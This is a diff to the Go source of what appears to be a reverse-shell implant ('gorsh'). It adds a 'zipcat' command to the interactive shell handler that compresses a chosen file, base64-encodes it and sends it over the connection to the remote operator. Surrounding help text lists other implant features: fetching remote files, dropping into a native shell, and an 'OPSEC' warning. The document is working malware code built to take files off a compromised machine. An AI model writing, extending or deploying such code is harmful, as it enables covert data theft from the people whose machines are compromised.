@@ -19,6 +19,7 @@ import (
 	"github.com/audibleblink/gorsh/internal/fetch"
 	"github.com/audibleblink/gorsh/internal/shell"
 	"github.com/audibleblink/gorsh/internal/sitrep"
+	"github.com/audibleblink/gorsh/internal/zip"
 )
 
 const (
@@ -174,6 +175,19 @@ func InteractiveShell(conn net.Conn) {
 				net := sitrep.All()
 				Send(conn, net)
 
+			case "zipcat":
+				if len(argv) != 2 {
+					Send(conn, "Usage: zipcat <file>")
+				} else {
+					bytes, err := zip.Bytes(argv[1])
+					if err != nil {
+						Send(conn, err.Error())
+					} else {
+						b64 := base64.StdEncoding.EncodeToString(bytes)
+						Send(conn, b64)
+					}
+				}
+
 			case "help":
 				Send(conn, "Currently implemented commands: \n"+
 					"cd [path]          -  Change the process' working directory\n"+
@@ -181,6 +195,7 @@ func InteractiveShell(conn net.Conn) {
 					"pwd                -  Print the current working directory\n"+
 					"ps                 -  Print process information\n"+
 					"cat <file>         -  Print the contents of the given file\n"+
+					"zipcat <file>      -  Compress, base64, and print the given file\n"+
 					"base64 <file>      -  Base64 encode the given file and print\n"+
 					"fetch <URI> <file> -  Fetch stuff. http[s]:// or //share/folder (Windows only)\n"+
 					"shell              -  Drops into a native shell. Mind your OPSEC\n"+
